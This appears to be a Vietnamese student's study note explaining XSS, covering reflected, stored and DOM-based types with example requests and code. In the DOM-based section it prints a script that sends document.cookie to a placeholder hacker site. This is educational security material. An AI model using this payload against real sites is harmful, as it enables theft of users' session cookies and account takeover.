- Tìm hiểu XSS và các loại tấn công XSS (XSS là gì, tại sao lại xảy ra lỗi, các loại tấn công phổ biến, cách khai thác + một số cách bypass mà em biết, cách ngăn chặn)
- Dựng lại lab: 3 loại XSS (Reflected, Stored, DOM) <br>
Yêu cầu: Viết lý thuyết lổ hổng 1 cách chi tiết.

# XSS 
## XSS là gì?
- XSS là một lỗ hổng bảo mật cho phép kẻ tấn công chèn thêm vào một loại mã độc(thường là JavaScript) vào một trang web, và khi người dùng truy cập trang web đó mã độc sẽ thực thi trên trình duyệt ngưởi dùng. Điều này cho phép kẻ tấn công lấy được thông tin cá nhân của người dùng, thực hiện các hành động giả mạo hoặc hành động trên trang web thay người dùng.
- Mục đích chính của các cuộc tấn công này là ăn cắp dữ liệu nhận dạng như: cookies, session, tokens... Tấn công XSS được thực hiện ở phía client, phổ biến là thực hiện với HTML và JavaScript.
## Tại sao lại xảy ra lỗi?
- XSS xảy ra khi web không kiểm soát được dữ liệu đầu vào của người dùng . Cụ thể, khi người dùng nhập nhập vào các đầu vào, dữ liệu này có thể chứa ký tự đặc biệt hoặc các mã độc. Và khi không được xử lý đúng thì nó có thể truyền ngược lại cho trình duyệt của người dùng và các đoạn mã độc được thực hiện trên máy người dùng.
- XSS cũng có thể xảy ra khi lưu trữ các dữ liệu nhập vào như bình luận hoặc nội dung mà không qua xử lý. <br>
Qua đó, kẻ tấn công có thể dùng mã độc đó để tấn công, ăn cắp dữ liệu quan trọng ...
## Các loại tấn công phổ biến:
### 1. Reflected XSS
Đây là loại XSS đơn giản nhất. Nó xảy ra khi nhận dữ liệu trong một HTTP request và bao gồm dữ liệu trong phản hồi lập tức theo cách không an toàn. Ví dụ:
```
https://insecure-website.com/status?message=All+is+well.
<p>Status: All is well.</p>
```
Ứng dụng không thực hiện xử lý dữ liệu, vì vậy kẻ tấn công có thể thực hiện cuộc tấn công:
```
https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
<p>Status: <script>/* Bad stuff here... */</script></p>
```
Khi người dùng truy cập vào một URL có chứa đoạn mã độc. Khi đó trình duyệt sẽ gửi yêu cầu đến server và server trả về trang web kèm tham số được truyền trên URL. Từ đó, các tham số chứa mã độc đó được thực thi trên trình duyệt người dùng.
### Mức độ của tấn công
Kẻ tấn công có thể kiểm soát được tập lệnh thực thi của trình duyệt người dùng. Ngoài ra có thể:
- Thực hiện hành động trong ứng dụng mà người dùng thực hiện được:
- Xem bất ký thông tin nào có thể xem.
- Sửa đổi thông tin nào có thể sửa đổi.
- Tương tác với người dùng khác để mở rộng tấn công.
### 2. Stored XSS 
Stored XSS xảy ra khi ứng dụng nhận dữ liệu từ nguồn không đáng tin cậy và bao gồm dữ liệu đó trong HTTP response một cách không an toàn. <br>
Giả sử 1 web cho người dùng gửi comment lên 1 blog và được hiện thị đến người dùng khác. Ví dự khi gửi HTTP request:
```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```
Sau khi gửi thành công, bất kỳ người dùng nào cũng có thể thấy được comment và phản hồi dưới dạng:
```
<p>This post was extremely helpful.</p>
```
Khi ứng dụng không có xử lý khác, kẻ tấn công sẽ chèn mã độc vào comment đó, khi đó bất kỳ người dùng nào truy cập vào blog đó thì ứng dụng sẽ thực thi mã độc.
#### Mức độ của tấn công
- Kẻ tấn công có thể thực hiện bất cứ hành động nào mà nạn nhân thực hiện được như cuộc tấn công Reflected XSS.
- Điểm khác biệt giữa Stored XSS với Reflected XSS là cuộc tấn công này xảy ra trong chính ứng dụng web đó. Ngoài ra kẻ tấn công không phải tìm cách cho nạn nhân thực hiện hành động mới có thể khai thác được mà ở đây bất kỳ nạn nhân trong ứng dụng gặp phải mã độc đó. Với Stored XSS, kẻ tấn công dễ dàng đạt được mục đích hơn vì nạn nhân bị tấn công thì chắc chắn khi đó người dùng đã login và trong phiên làm việc(session) của web.
- Đối tưởng bị ảnh hưởng với Stored XSS có thể là tất cả những người sử dụng ứng dụng web đó.
### 3. DOM-based XSS
- DOM-based XSS xảy ra khi JavaScript lấy dữ liệu từ nguồn có thể kiểm soát của kẻ tấn công và dữ liệu đó được đưa đưa vào phần thực thi code. Khi người dùng truy cập vào trang web đó, mã độc sẽ được thực thi trong trình duyệt của họ, cho phép kẻ tấn công thực hiện các hành động độc hại, như đánh cắp thông tin người dùng hoặc thực hiện các giao dịch không được ủy quyền. <br>
- Sự khác biệt chính giữa DOM-based XSS và các hình thức XSS khác là trong DOM-based XSS, mã độc được chèn vào và thực thi trực tiếp trên Document Object Model (DOM) của trang web, thay vì thông qua các tài liệu HTML hoặc các yếu tố khác trên trang web. Do đó lỗ hổng này chỉ có thể ảnh hưởng ở client-side. <br>
Giả sử 1 trang web chi phép người dùng tìm kiếm thông tin tài khoản bằng cách nhập vào input và yêu cầu đến máy chủ. JavaScript hiện thị kết quả tìm kiếm: 
```
document.getElementById("search_results").innerHTML = "Result of " + username 
```
Trong trường hợp này, kẻ tấn công sẽ chèn mã độc vào trường tìm kiếm và nhập tên người dùng sau:
```
<script>
  window.location="http://[hacker site]?c="+document.cookie
</script>
```
Khi trình duyệt thực hiện mã độc này sẽ chuyển hướng đến site của hacker kèm cookie và khi đó kẻ tấn công có được cookie và sử dụng với mục đích xấu.
#### Mức độ của tấn công
Giống với các cuộc tấn công khác của XSS, kẻ tấn công có thể ăn căp thông tin quan trọng người dùng, thực hiện các hành động khác ... 


